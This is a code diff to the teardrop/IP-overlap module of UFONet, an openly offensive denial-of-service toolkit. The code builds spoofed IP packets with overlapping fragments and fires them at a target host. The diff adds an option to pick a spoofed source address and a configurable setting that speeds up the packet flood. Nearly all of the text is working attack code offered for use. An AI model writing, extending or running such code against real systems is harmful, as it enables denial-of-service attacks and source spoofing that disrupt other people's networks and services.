@@ -10,6 +10,8 @@ with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 import sys, random, socket
+
+from core.mods.mod_config import OVERLAP_SPEED
 try:
     from urlparse import urlparse
 except:
@@ -29,14 +31,19 @@ def randInt():
     x = random.randint(1,65535) # TCP ports
     return x
 
-def overlapize(ip, sport, rounds):
+def overlapize(ip, sport, rounds, source=None):
     n=0
     try:
         for x in range (0,int(rounds)):
             n=n+1
             s_zombie_port = randInt() 
             IP_p = IP()
-            IP_p.src = randIP()
+            if source is None:
+                print("[Info] [OVERLAP] Using random source IP")
+                IP_p.src = randIP()
+            else:
+                print("[Info] [OVERLAP] Using given source IP")
+                IP_p.src = source
             try:
                 IP_p.dst = ip
             except:
@@ -48,14 +55,14 @@ def overlapize(ip, sport, rounds):
                 send(IP(src=IP_p.src, dst=IP_p.dst, id=12345, flags=0x1, frag=0)/payload, verbose=0)
                 send(IP(src=IP_p.src, dst=IP_p.dst, id=12345, flags=0x0, frag=1)/overlap, verbose=0) # teardrop frag
                 print("[Info] [AI] [OVERLAP] Firing 'deuterium gravitons' ["+str(n)+"] -> [OVERLAPPING!]")
-                time.sleep(1) # sleep time required for balanced sucess
+                time.sleep(1/OVERLAP_SPEED) # sleep time required for balanced sucess
             except:
                 print("[Error] [AI] [OVERLAP] Failed to engage with 'deuterium gravitons' ["+str(n)+"]")
     except:
         print("[Error] [AI] [OVERLAP] Failing to engage... -> Is still target online? -> [Checking!]")
 
 class OVERLAP(object):
-    def attacking(self, target, rounds):
+    def attacking(self, target, rounds, source=None):
         print("[Info] [AI] 'IP OVERLAPPING' (OVERLAPGER) is ready to fire: [" , rounds, "deuterium gravitons ]")
         if target.startswith('http://'):
             target = target.replace('http://','')
@@ -79,4 +86,4 @@ class OVERLAP(object):
         if ip == "127.0.0.1" or ip == "localhost":
             print("[Info] [AI] [OVERLAP] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
             return
-        overlapize(ip, sport, rounds) # attack with OVERLAP using threading
+        overlapize(ip, sport, rounds, source=None) # attack with OVERLAP using threading
